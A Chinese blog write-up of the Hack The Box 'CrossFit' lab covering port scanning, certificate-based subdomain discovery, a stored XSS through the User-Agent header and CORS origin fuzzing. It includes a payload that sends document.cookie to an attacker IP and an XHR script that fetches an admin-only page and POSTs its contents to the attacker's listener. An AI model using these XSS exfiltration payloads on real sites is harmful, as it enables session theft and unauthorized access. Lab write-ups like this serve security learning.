        <content type="html"><![CDATA[<span class='btn'><a class="button"  title='Web'><i class='fas fa-tag'></i>Web</a></span> <span class='btn'><a class="button"  title='XSS'><i class='fas fa-tag'></i>XSS</a></span> <span class='btn'><a class="button"  title='CSRF'><i class='fas fa-tag'></i>CSRF</a></span> <span class='btn'><a class="button"  title='JavaScript'><i class='fas fa-tag'></i>JavaScript</a></span> <span class='btn'><a class="button"  title='CORS'><i class='fas fa-tag'></i>CORS</a></span> <span class='btn'><a class="button"  title='SFTP信息泄漏'><i class='fas fa-tag'></i>SFTP信息泄漏</a></span> <span class='btn'><a class="button"  title='内网子域收集'><i class='fas fa-tag'></i>内网子域收集</a></span><p>第一次刷 Hack The Box，因为看到别人写的WP，好像很好玩，然后就心里痒痒的~ </p><p>然后随便调了个顺眼的…结果玩着玩着才发现是 insane 难度。。。。</p><p>吐槽：卡死了…加载一些静态资源….特别是和google有关的，所以直接 SwitchyOmega 安排上，把google相关的挂代理，速度就起飞了。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>这里被分配到的IP为 <code>10.10.10.208</code></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- --min-rate=1000 -T4 -sC -sV -Pn 10.10.10.208</span><br></pre></td></tr></table></figure><p>参数说明<sup><a href="https://www.sqlsec.com/2017/07/nmap.html">[1]</a><a href="https://nmap.org/man/zh/man-port-scanning-techniques.html">[2]</a></sup></p><ul><li><p>-p- 全端口扫描缩写，特点是巨慢…（300ms延迟约需1个小时）</p></li><li><p>-sV 扫描目标主机和端口上运行的软件的版本，但不扫描开放端口，nmap默认使用 -sT 扫描</p><ul><li>-sT TCP扫描</li><li>-sU UDP扫描，UDP 扫描发送 UDP 数据包到目标主机，并等待响应。如果返回 ICMP 不可达的错误消息，说明端口是关闭的</li><li>-sS 使用SYN<a href="https://baike.baidu.com/item/SYN%E6%89%AB%E6%8F%8F/17658294">半开放扫描<sup>[2]</sup></a></li><li>-sP ping扫描，用类似ping的方式发现主机</li><li>-sF FIN 扫描也不会在目标主机上创建日志（FIN扫描的优势之一），如果收到一个RST报文，该端口被认为是 closed(关闭的)，而没有响应则意味着 端口是open|filtered(开放或者被过滤的)</li><li>其余扫描方式可见官网<a href="https://nmap.org/man/zh/man-port-scanning-techniques.html">端口扫描技术</a></li></ul></li><li><p>-sC 根据端口识别的服务,调用默认脚本</p></li><li><p>-T4，设置时间模板，共6个，依次为</p><ul><li><code>0 paranoid</code> 和 1 sneaky 模式用于IDS躲避</li><li><code>2 Polite</code> 模式降低了扫描 速度以使用更少的带宽和目标主机资源。</li><li><code>3 Normal</code> 为默认模式，因此-T3 实际上是未做任何优化。</li><li><code>4 Aggressive</code> 模式假设用户具有合适及可靠的网络从而加速扫描.</li><li><code>5 insane</code> 模式假设用户具有特别快的网络或者愿意为获得速度而牺牲准确性。</li></ul></li></ul><p>使用其他工具交叉扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan 10.10.10.208 --ports 0-65535</span><br></pre></td></tr></table></figure><p>没啥发现</p><p>端口扫描结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&gt; nmap -p- --min-rate=1000 -T4 -sC -sV -Pn 10.10.10.208</span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked <span class="string">&#x27;up&#x27;</span> and scan <span class="built_in">times</span> will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 11:37 CST</span><br><span class="line">Warning: 10.10.10.208 giving up on port because retransmission <span class="built_in">cap</span> hit (6).</span><br><span class="line">Stats: 0:15:50 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan</span><br><span class="line">Connect Scan Timing: About 22.97% <span class="keyword">done</span>; ETC: 12:46 (0:53:06 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.208</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 65511 closed ports</span><br><span class="line">PORT      STATE    SERVICE     VERSION</span><br><span class="line">21/tcp    open     ftp         vsftpd 2.0.8 or later</span><br><span class="line">| ssl-cert: Subject: commonName=*.crossfit.htb/organizationName=Cross Fit Ltd./stateOrProvinceName=NY/countryName=US</span><br><span class="line">| Not valid before: 2020-04-30T19:16:46</span><br><span class="line">|_Not valid after:  3991-08-16T19:16:46</span><br><span class="line">22/tcp    open     ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 b0:e7:5f:5f:7e:5a:4f:e8:e4:cf:f1:98:01:cb:3f:52 (RSA)</span><br><span class="line">|   256 67:88:2d:20:a5:c1:a7:71:50:2b:c8:07:a4:b2:60:e5 (ECDSA)</span><br><span class="line">|_  256 62:ce:a3:15:93:c8:8c:b6:8e:23:1d:66:52:f4:4f:ef (ED25519)</span><br><span class="line">80/tcp    open     http        Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Apache2 Debian Default Page: It works</span><br><span class="line">1918/tcp  filtered can-nds</span><br><span class="line">4465/tcp  filtered unknown</span><br><span class="line">5392/tcp  filtered unknown</span><br><span class="line">7487/tcp  filtered unknown</span><br><span class="line">8161/tcp  filtered patrol-snmp</span><br><span class="line">14933/tcp filtered unknown</span><br><span class="line">16477/tcp filtered unknown</span><br><span class="line">24729/tcp filtered unknown</span><br><span class="line">27866/tcp filtered unknown</span><br><span class="line">31979/tcp filtered unknown</span><br><span class="line">40147/tcp filtered unknown</span><br><span class="line">41161/tcp filtered unknown</span><br><span class="line">42569/tcp filtered unknown</span><br><span class="line">44322/tcp filtered pmcdproxy</span><br><span class="line">47236/tcp filtered unknown</span><br><span class="line">51658/tcp filtered unknown</span><br><span class="line">52857/tcp filtered unknown</span><br><span class="line">57857/tcp filtered unknown</span><br><span class="line">61414/tcp filtered unknown</span><br><span class="line">62126/tcp filtered unknown</span><br><span class="line">64845/tcp filtered unknown</span><br><span class="line">Service Info: Host: Cross; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p>然后也用了 fscan 对 ftp 和 ssh 弱口令进行排查</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan -h 10.10.10.208</span><br></pre></td></tr></table></figure><p>目录爆破，啥都没，好家伙，做到这就没思路了</p><h3 id="sftp敏感信息泄漏"><a href="#sftp敏感信息泄漏" class="headerlink" title="sftp敏感信息泄漏"></a>sftp敏感信息泄漏</h3><p>掌握一个新姿势，vsftp 证书签名可能会有敏感信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_client -connect 10.10.10.208:21 -starttls ftp</span><br></pre></td></tr></table></figure><p><img src="/img/htb-crossfit/image-20210808171519802.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210808171519802.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210808171519802"></p><p>得到邮箱地址和子域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*.crossfit.htb</span><br><span class="line">emailAddress = info@gym-club.crossfit.ht</span><br></pre></td></tr></table></figure><p>然后把这个子域加到我们本机host 上，然后用子域访问..</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.10.208 gym-club.crossfit.htb&quot; &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><h3 id="进一步信息搜集"><a href="#进一步信息搜集" class="headerlink" title="进一步信息搜集"></a>进一步信息搜集</h3><p>访问得到一个健身俱乐部页面，首页最下面和联系我们的页面，题目标签是XSS、CSRF，盲猜这两至少一处有XSS</p><p>用 burp 的 instereting files and directories 扫了扫目录，有个 readme.txt ，不过内容是关于wordpress 的 colorlib 主题的 readme，没什么收获</p><p>emmm，看了WP发现用的 dirburst的字典，自用35w字典没找到… 这里官方WP使用 <a href="https://github.com/OJ/gobuster">gobuster</a>，我这里用的自己写的小工具，虽然用了协程，但速度完全比不上go的，，差了1倍….</p><p><img src="/img/htb-crossfit/image-20210808170432327.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210808170432327.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210808170432327"></p><p>发现目录信息泄漏</p><p><img src="/img/htb-crossfit/image-20210808170812474.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210808170812474.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210808170812474"></p><p>不过访问后 <a href="http://gym-club.crossfit.htb/security_threat/report.php">http://gym-club.crossfit.htb/security_threat/report.php</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your are not allowed to access this page.</span><br></pre></td></tr></table></figure><h2 id="Web漏洞利用"><a href="#Web漏洞利用" class="headerlink" title="Web漏洞利用"></a>Web漏洞利用</h2><h3 id="验证-XSS"><a href="#验证-XSS" class="headerlink" title="验证 XSS"></a>验证 XSS</h3><p>对这两个输入框打了下，发现好像不出网…(burp进行了一次URL编码，最后抓包改一下包为编码前的数据)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;kmy9o4.dnslog.cn&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在     <a href="http://gym-club.crossfit.htb/blog-single.php">http://gym-club.crossfit.htb/blog-single.php</a> 页面下面的评论区发现疑似 xss 点，在内容处输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/htb-crossfit/image-20210808172032797.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210808172032797.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210808172032797"></p><p>这里还说明了还会记录我们的 IP 信息和浏览器信息（猜测为UA），那管理员当然也能看到 （</p><p>一开始想了半天怎么利用xss，后来发现靶机IP是可以直接访问到我们的….啊这….</p><p>那直接监听本机 80 端口咯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lv 0.0.0.0 80</span><br></pre></td></tr></table></figure><p>然后评论区内容不变，更改UA为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://10.10.14.3&quot;&gt;</span><br></pre></td></tr></table></figure><p>其中 src 的 IP 为本机被 openvpn 分配的 IP</p><p><img src="/img/htb-crossfit/image-20210808172910089.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210808172910089.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210808172910089"></p><p>毕竟都检测XSS了，那我们评论区输入的内容输出肯定被编码的，2333 然后这里用 UA，可以，很强势！</p><p>那有时渗透能用 XFF，毕竟一般惯性思维（指开发），这两个参数，不会被输入恶意字符</p><p><img src="/img/htb-crossfit/image-20210808173032809.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210808173032809.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210808173032809"></p><p>尝试获取Cookie</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;svg/onload=&quot;javascript:document.location.href=(&#x27;http://10.10.14.3?cookie=&#x27;+btoa(document.cookie))&quot;&gt;</span><br></pre></td></tr></table></figure><p>不过啥都没返回</p><p><img src="/img/htb-crossfit/image-20210808174556286.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210808174556286.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210808174556286"></p><p>应该是管理员端设置了httponly，导致不能document.cookie不能<sup><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies">[3]</a></sup>获取Cookie</p><h3 id="尝试-XSS-XHR"><a href="#尝试-XSS-XHR" class="headerlink" title="尝试 XSS+XHR"></a>尝试 XSS+XHR</h3><p>虽然不能获取管理员cookie，但我们可以利用管理员的身份通过<code>XMLHttpRequests</code>请求我们请求不到资源。就管理员访问我们构造的 JS 异步请求代码，他就会带上他的 Cookie 请求我们无法请求的资源，然后把结果返回给我们，这不就常用的XSS+CSRF（SSRF）组合拳，哈哈。</p><p>那请求啥页面我们请求不到的呢？ 比如刚刚的 <code>security_threat/report.php</code> ！</p><p>参考2019UNCTF<sup>[4]</sup>，将以下代码保存为 payload0.js（下面 IP 变为 10.10.14.13 是因为openvpn断了，所以我本机IP变了）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">this</span>.readyState === <span class="number">4</span> &amp;&amp; <span class="built_in">this</span>.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    xhr2.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://10.10.14.13:2233/&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">    xhr2.send(<span class="built_in">this</span>.responseText); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://gym-club.crossfit.htb/security_threat/report.php&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure><p>远程要加载我们的代码，肯定要起一个HTTP服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>然后获取返回数据为 2233 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2233</span><br></pre></td></tr></table></figure><p>构造UA</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://10.10.14.13/payload0.js&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>发送请求（一次接收不到数据可以多试两次，可能是网络环境不稳定原因？）</p><p><img src="/img/htb-crossfit/image-20210812235755982.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210812235755982.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210812235755982"></p><p>不过好像没啥有用的东西，就一个查看日志的页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 10.10.14.13:2233</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://gym-club.crossfit.htb/security_threat/report.php</span><br><span class="line">Content-Type: text/plain;charset=UTF-8</span><br><span class="line">Content-Length: 343</span><br><span class="line">Origin: http://gym-club.crossfit.htb</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Security Report<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-tag">table</span>, <span class="selector-tag">th</span>, <span class="selector-tag">td</span> &#123;</span></span><br><span class="line"><span class="css">      <span class="attribute">border</span>: <span class="number">1px</span> solid black;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>Logged XSS attempts<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>Timestamp<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>User Agent<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>IP Address<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>先跟着wp走吧~</p><h3 id="同源信息收集"><a href="#同源信息收集" class="headerlink" title="同源信息收集"></a>同源信息收集</h3><p>因为目录爆破没找到啥可通过<code>XMLHttpRequests</code>利用的，所以把目标指向子域，这里通过 <a href="https://github.com/xmendez/wfuzz">wfuzz</a> 进行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w ~/Desktop/subdomains-top1mil-110000.txt -H <span class="string">&quot;Host: FUZZ.crossfit.htb&quot;</span> --hh 10701 http://10.10.10.208</span><br></pre></td></tr></table></figure><p>其中 </p><ul><li><p>字典 kali有 <code>sudo find / | grep subdomains-top1mil-110000.txt</code></p></li><li><p>FUZZ 是占位符，字典要替换的部分</p></li><li><p>–hh 是隐藏 Chars部分，即页面内容的字符，这里隐藏 Apache页面返回 10701字符的结果，如果不隐藏会出现一堆 Apache 页面的结果 （</p></li><li><p>原来 http 的 header Host 字段是干这个用的，apache等中间件通过Host来匹配对应的虚拟主机 （</p></li></ul><p>不过扫描结果好像没啥有用的.. 有返回的返回码都是400（可能请求频率太快了）</p><p>仔细一想，既然我们要跨源请求，直接找子域名肯定行不通的，由于同源策略的原因，就算管理员访问了带有XSS代码的页面，浏览器肯定不让xhr接收源B的返回信息，直接拦截。所以现在目标变成了：找到一个子域名，能让gym-club.crossfit.htb 跨源请求，这样才能把信息待会给我们。</p><p>但问题是，，如何才能找到这个子域名…</p><p>WP有个很骚的想法：我们要找的子域名如果能让 gym-club.crossfit.htb 跨源请求，那么 gym-club.crossfit.htb 是否也能被我们要找的子域名跨源请求呢？</p><p>知道这个有啥用呢？根据同源策略，如果源A可以跨源请求源B，那么在源A跨源请求源B设置HTTP请求头的<code>Origin</code>字段为源B的域名（这个和用户浏览器在源B站向源A站发送请求的数据包是一样的），源B的HTTP返回包 <code>Access-Control-Allow-Origin</code> 字段会显示 源B 的域名，这样用户浏览器在源B向源A请求获取返回数据时，浏览器看到  <code>Access-Control-Allow-Origin</code> 字段为源B的域名（源B请求后端，Allow-Origin源B，不就同源了），就不会拦截，可正常接口到数据。</p><blockquote><p><strong>注意:</strong> 这些跨站点请求与浏览器发出的其他跨站点请求并无二致。如果服务器未返回正确的响应首部，则请求方不会收到任何数据。因此，那些不允许跨站点请求的网站无需为这一新的 HTTP 访问控制特性担心。</p><p>– 摘自 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS</a></p></blockquote><p>其实很好理解，好比用户在源A前端通过xhr发送请求至源A后端，同源嘛，那<code>Origin</code>就是源A嘛，源A后端看到这个<code>Orgin</code>返回的  <code>Access-Control-Allow-Origin</code> 为源A，同源了，浏览器能正常接收数据，没问题。那源B前端通过xhr发送请求至源A后端，Origin是源B，然后返回的  <code>Access-Control-Allow-Origin</code> 为源B，也就是源B前端请求，后端返回源B，也同源，浏览器能正常接收数据。</p><p>当然这个是要在源A的后端代码或配置文件配置的，即哪些源是我们可信的。</p><p>也就是说，找到同源的子域，我们的XSS就可以利用了！因为如果能找到这个子域名，gym-club.crossfit.htb 向子域发出的 xhr是同源的，能正常获取数据，待 <code>xmlhttp.readyState==4</code> ，即下载操作已完成时，就可以通过 <code>responseText</code> 获取返回的数据了，就我们就可以获取我们无权限或无法直接访问到的页面的内容啦。</p><p>那具体如何做呢？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w ~/Desktop/subdomains-top1mil-110000.txt -H <span class="string">&quot;Origin: http://FUZZ.crossfit.htb&quot;</span> --filter <span class="string">&quot;r.headers.response~&#x27;Access-Control-Allow-Origin&#x27;&quot;</span> http://gym-club.crossfit.htb/</span><br></pre></td></tr></table></figure><ul><li>–filter 中的 <code>str1~str2</code> 表示<code>str2</code>是否在<code>str1</code>中<sup>[5]</sup>，即表示使用源 <code>http://xxx.crossfit.htb</code> 访问 <a href="http://gym-club.crossfit.htb/">http://gym-club.crossfit.htb/</a> ，如果 Access-Control-Allow-Origin 为 <code>http://xxx.crossfit.htb</code> ，说明源 <code>http://xxx.crossfit.htb</code> 可以跨源请求<a href="http://gym-club.crossfit.htb/">http://gym-club.crossfit.htb/</a> ，且用户在浏览器端可正常接口 <a href="http://gym-club.crossfit.htb/">http://gym-club.crossfit.htb/</a>  返回的数据。</li><li>那为啥不是 <code>r.headers.response~&#39;Access-Control-Allow-Origin: http://FUZZ.crossfit.htb</code> ? 正常来说，如果服务端没配置这个源访问，直接不会返回这个字段。匹配字段短点，速度也快点，虽然加上更严谨 （</li><li>PS: <code>Origin: </code> 记得别漏了 <code>http://</code>开头…不然服务端不会返回 <code>Access-Control-Allow-Origin:</code> </li></ul><p><img src="/img/htb-crossfit/image-20210812230746214.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210812230746214.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210812230746214"></p><p>好耶！也就是说 <a href="http://ftp.crossfit.htb/">http://ftp.crossfit.htb</a> 这个站是存在的</p><p><img src="/img/htb-crossfit/image-20210811234123168.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210811234123168.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210811234123168"></p><p>把host文件更新一波</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.208 gym-club.crossfit.htb ftp.crossfit.htb</span><br></pre></td></tr></table></figure><p>访问一下发现还是 apache 默认页面</p><p><img src="/img/htb-crossfit/image-20210811235550733.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210811235550733.png" 